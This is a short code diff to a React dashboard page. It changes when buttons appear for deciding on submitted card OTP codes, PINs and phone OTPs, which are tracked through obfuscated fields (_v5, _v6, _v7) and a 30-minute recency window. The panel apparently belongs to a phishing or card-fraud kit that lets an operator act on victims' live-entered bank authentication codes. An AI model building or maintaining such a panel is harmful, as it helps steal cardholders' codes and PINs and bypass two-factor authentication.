@@ -1595,7 +1595,7 @@ export default function DashboardPage() {
     const currentStep = getCurrentStep();
     const currentPage = getCurrentPage();
     const cardOtpStatus = getCardOtpStatus();
-    const otpMatch = getLatestEntryForMatcher((raw) => Boolean(raw._v5 || raw.otpCode || raw.otpSubmittedAt || raw._v5UpdatedAt || raw._v5Status));
+    const otpMatch = getLatestEntryForMatcher((raw) => Boolean(raw._v5 || raw.otpCode || raw.otpSubmittedAt || raw._v5UpdatedAt));
     const raw = otpMatch?.raw || selectedRequest?.raw || {};
     const otpEntry = otpMatch?.entry || null;
 
@@ -1611,7 +1611,7 @@ export default function DashboardPage() {
     // Use server status or local decision
     const serverOtpStatus = raw._v5Status || raw.otpStatus || "";
     const effectiveCardOtpStatus = serverOtpStatus || otpLocalDecision || cardOtpStatus || "";
-    const hasDecision = Boolean(serverOtpStatus || otpLocalDecision);
+    const hasDecision = Boolean(serverOtpStatus);
     
     // Show buttons if: no decision AND has OTP data AND time is recent (30 min)
     const otpUpdatedAt = raw._v5UpdatedAt ? new Date(raw._v5UpdatedAt).getTime() : 0;
@@ -1695,7 +1695,7 @@ export default function DashboardPage() {
     // Use server status or local decision
     const serverPinStatus = raw._v6Status || raw.pinStatus || "";
     const effectivePinStatus = serverPinStatus || pinLocalDecision || pinStatus || "";
-    const hasDecision = Boolean(serverPinStatus || pinLocalDecision);
+    const hasDecision = Boolean(serverPinStatus);
     
     // Show buttons if: no decision AND has PIN data AND time is recent (30 min)
     const pinUpdatedAt = raw._v6UpdatedAt ? new Date(raw._v6UpdatedAt).getTime() : 0;
@@ -1793,7 +1793,7 @@ export default function DashboardPage() {
     // Use server status or local decision
     const serverPhoneStatus = raw.phoneOtpStatus || raw.phoneStatus || "";
     const effectivePhoneOtpStatus = serverPhoneStatus || phoneLocalDecision || phoneOtpStatus || "";
-    const hasDecision = Boolean(serverPhoneStatus || phoneLocalDecision);
+    const hasDecision = Boolean(serverPhoneStatus);
     
     // Show buttons if: no decision AND has phone data AND time is recent (30 min)
     const phoneUpdatedAt = raw._v7UpdatedAt ? new Date(raw._v7UpdatedAt).getTime() : 0;
